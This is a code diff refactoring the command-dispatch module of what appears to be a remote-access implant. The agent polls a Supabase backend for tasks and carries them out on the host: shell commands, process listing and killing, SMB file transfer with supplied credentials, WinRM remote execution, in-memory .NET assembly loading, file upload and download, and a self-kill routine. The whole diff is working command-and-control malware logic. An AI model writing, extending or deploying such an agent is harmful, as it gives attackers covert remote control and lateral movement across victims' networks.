@@ -1,15 +1,16 @@
 import os
 import logging
-from supabase import Client  # Import the Client class
+from supabase import create_client
 from .commands import update_command_status, fetch_pending_commands_for_hostname
 from .file_operations import handle_download_command, handle_upload_command, fetch_pending_uploads, download_from_supabase
 from .system_info import get_system_info
-from .config import SUPABASE_KEY
+from .config import supabase, SUPABASE_KEY
 
 # Conditional import based on the operating system
 if os.name == 'nt':  # 'nt' indicates Windows
-    from utils.winapi import ls, list_users_in_group, smb_write
+    from utils.winapi import ls, list_users_in_group
     from utils.winapi.smb_get import smb_get  # Ensure correct import
+    from utils.winapi.smb_write import smb_write  # Ensure correct import
     from utils.winapi.winrm_execute import winrm_execute  # Import the winrm_execute function
     from utils.winapi.pwd import wpwd  # Import the wpwd function
     from utils.winapi.wami import wami  # Import the wami function
@@ -17,7 +18,7 @@ if os.name == 'nt':  # 'nt' indicates Windows
     from utils.winapi.run import run_process  # Import the run function
     from utils.winapi.netexec import load_dotnet_assembly  # Import the netexec function
 
-def handle_kill_command(command_id, command_text, hostname, supabase: Client):
+def handle_kill_command(command_id, command_text, hostname):
     """Handles the kill command, updates the command status to 'Completed', marks the agent as 'Dead', and exits."""
     if command_text.strip().lower() == "kill":
         logging.info("Kill command received. Updating status and preparing to exit agent.")
@@ -55,25 +56,25 @@ def handle_kill_command(command_id, command_text, hostname, supabase: Client):
             logging.info("Shutdown sequence initiated.")
             os._exit(0)  # Force the agent to terminate
 
-def execute_commands(supabase: Client):
+def execute_commands():
     """Executes pending commands and handles file uploads/downloads."""
 
     hostname, ip, os_info = get_system_info()
 
     # Handle pending uploads
-    pending_uploads_response = fetch_pending_uploads(supabase)
+    pending_uploads_response = fetch_pending_uploads()
     if pending_uploads_response.data:
         for upload in pending_uploads_response.data:
             file_url = upload.get('file_url')
             remote_path = upload.get('remote_path')
             if file_url and remote_path:
-                if download_from_supabase(file_url, remote_path, SUPABASE_KEY, supabase):
+                if download_from_supabase(file_url, remote_path):
                     supabase.table("uploads").update({"status": "completed"}).eq("id", upload['id']).execute()
                 else:
                     supabase.table("uploads").update({"status": "failed"}).eq("id", upload['id']).execute()
 
     # Fetch and handle commands for the hostname
-    pending_commands_response = fetch_pending_commands_for_hostname(hostname, supabase)
+    pending_commands_response = fetch_pending_commands_for_hostname(hostname)
     if pending_commands_response.data:
         for command in pending_commands_response.data:
             command_id = command['id']
@@ -82,7 +83,7 @@ def execute_commands(supabase: Client):
 
             # Handle kill command (this will exit the script if applicable)
             if command_text.lower().startswith('kill'):
-                handle_kill_command(command_id, command_text, hostname, supabase)
+                handle_kill_command(command_id, command_text, hostname)
 
             # Handle 'ls' command only if on Windows
             elif os.name == 'nt' and command_text.lower().startswith('ls'):
@@ -94,7 +95,7 @@ def execute_commands(supabase: Client):
                 except Exception as e:
                     status = 'Failed'
                     output = str(e)
-                update_command_status(supabase, command_id, status, output, hostname, ip, os_info, username)
+                update_command_status(command_id, status, output, hostname, ip, os_info, username)
 
             # Handle 'ps' command only if on Windows
             elif os.name == 'nt' and command_text.lower() == 'ps':
@@ -105,7 +106,7 @@ def execute_commands(supabase: Client):
                 except Exception as e:
                     status = 'Failed'
                     output = str(e)
-                update_command_status(supabase, command_id, status, output, hostname, ip, os_info, username)
+                update_command_status(command_id, status, output, hostname, ip, os_info, username)
 
             # Handle 'ps grep' command only if on Windows
             elif os.name == 'nt' and command_text.lower().startswith('ps grep'):
@@ -117,7 +118,7 @@ def execute_commands(supabase: Client):
                 except Exception as e:
                     status = 'Failed'
                     output = str(e)
-                update_command_status(supabase, command_id, status, output, hostname, ip, os_info, username)
+                update_command_status(command_id, status, output, hostname, ip, os_info, username)
 
             # Handle 'ps term' command only if on Windows
             elif os.name == 'nt' and command_text.lower().startswith('ps term'):
@@ -129,7 +130,7 @@ def execute_commands(supabase: Client):
                 except Exception as e:
                     status = 'Failed'
                     output = str(e)
-                update_command_status(supabase, command_id, status, output, hostname, ip, os_info, username)
+                update_command_status(command_id, status, output, hostname, ip, os_info, username)
 
             # Handle 'run' command only if on Windows
             elif os.name == 'nt' and command_text.lower().startswith('run'):
@@ -141,7 +142,7 @@ def execute_commands(supabase: Client):
                 except Exception as e:
                     status = 'Failed'
                     output = str(e)
-                update_command_status(supabase, command_id, status, output, hostname, ip, os_info, username)
+                update_command_status(command_id, status, output, hostname, ip, os_info, username)
 
             # Handle 'whoami' command with OS check
             elif command_text.lower() == 'whoami':
@@ -161,7 +162,7 @@ def execute_commands(supabase: Client):
                     except Exception as e:
                         status = 'Failed'
                         output = str(e)
-                update_command_status(supabase, command_id, status, output, hostname, ip, os_info, username)
+                update_command_status(command_id, status, output, hostname, ip, os_info, username)
 
             # Handle 'users <group_name>' command only if on Windows
             elif os.name == 'nt' and command_text.lower().startswith('users '):
@@ -173,7 +174,7 @@ def execute_commands(supabase: Client):
                 except Exception as e:
                     status = 'Failed'
                     output = str(e)
-                update_command_status(supabase, command_id, status, output, hostname, ip, os_info, username)
+                update_command_status(command_id, status, output, hostname, ip, os_info, username)
 
             # Handle 'smb write <local_file_path> <remote_smb_path> [username password domain]' command only if on Windows
             elif os.name == 'nt' and command_text.lower().startswith('smb write '):
@@ -195,7 +196,7 @@ def execute_commands(supabase: Client):
                     except Exception as e:
                         status = 'Failed'
                         output = str(e)
-                update_command_status(supabase, command_id, status, output, hostname, ip, os_info, username)
+                update_command_status(command_id, status, output, hostname, ip, os_info, username)
 
             # Handle 'smb get <remote_file_path> <local_file_path> [username password domain]' command only if on Windows
             elif os.name == 'nt' and command_text.lower().startswith('smb get '):
@@ -217,7 +218,7 @@ def execute_commands(supabase: Client):
                     except Exception as e:
                         status = 'Failed'
                         output = str(e)
-                update_command_status(supabase, command_id, status, output, hostname, ip, os_info, username)
+                update_command_status(command_id, status, output, hostname, ip, os_info, username)
 
             # Handle 'winrmexec <remote_host> <command> [username password domain]' command only if on Windows
             elif os.name == 'nt' and command_text.lower().startswith('winrmexec '):
@@ -239,7 +240,7 @@ def execute_commands(supabase: Client):
                     except Exception as e:
                         status = 'Failed'
                         output = str(e)
-                update_command_status(supabase, command_id, status, output, hostname, ip, os_info, username)
+                update_command_status(command_id, status, output, hostname, ip, os_info, username)
 
             # Handle 'pwd' command with OS check
             elif command_text.lower() == 'pwd':
@@ -259,15 +260,15 @@ def execute_commands(supabase: Client):
                     except Exception as e:
                         status = 'Failed'
                         output = str(e)
-                update_command_status(supabase, command_id, status, output, hostname, ip, os_info, username)
+                update_command_status(command_id, status, output, hostname, ip, os_info, username)
 
             # Handle download command
             elif command_text.lower().startswith('download'):
-                status, output = handle_download_command(command_text, username, supabase)
+                status, output = handle_download_command(command_text, username)
 
             # Handle upload command
             elif command_text.lower().startswith('upload'):
-                status, output = handle_upload_command(command_text, username, supabase)
+                status, output = handle_upload_command(command_text, username)
 
             # Handle netexec command
             elif command_text.lower().startswith("netexec "):
@@ -280,7 +281,7 @@ def execute_commands(supabase: Client):
                 except Exception as e:
                     status = "Failed"
                     output = str(e)
-                update_command_status(supabase, command_id, status, output, hostname, ip, os_info, username)
+                update_command_status(command_id, status, output, hostname, ip, os_info, username)
 
             # Handle generic shell commands
             else:
@@ -291,4 +292,4 @@ def execute_commands(supabase: Client):
                 except Exception as e:
                     status = 'Failed'
                     output = str(e)
-                update_command_status(supabase, command_id, status, output, hostname, ip, os_info, username)
+                update_command_status(command_id, status, output, hostname, ip, os_info, username)
